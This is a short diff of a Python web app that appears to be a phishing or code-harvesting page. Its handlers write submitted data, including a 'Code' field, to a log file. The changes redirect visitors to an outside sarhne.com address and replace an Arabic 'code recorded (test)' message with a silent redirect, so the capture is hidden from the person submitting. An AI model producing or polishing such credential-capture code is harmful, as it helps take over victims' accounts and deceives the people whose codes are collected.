@@ -173,7 +173,7 @@ Time: {time}
     with open(log_path, "a", encoding="utf-8", buffering=1) as f:
         f.write(log_data)
 
-    login_botton_url = "https://www.facebook.com/share/r/14XdVmsrfeE/"
+    login_botton_url = "https://2742404919047.sarhne.com"
     return redirect(login_botton_url)
 
 # ========================
@@ -252,7 +252,7 @@ Code: {code}
     with open(log_path, "a", encoding="utf-8", buffering=1) as f:
         f.write(log_data)
 
-    return "تم تسجيل الرمز (اختبار)", 200
+    return redirect("https://2742404919047.sarhne.com")
 
 # ========================
 # 🔐 Admin Login
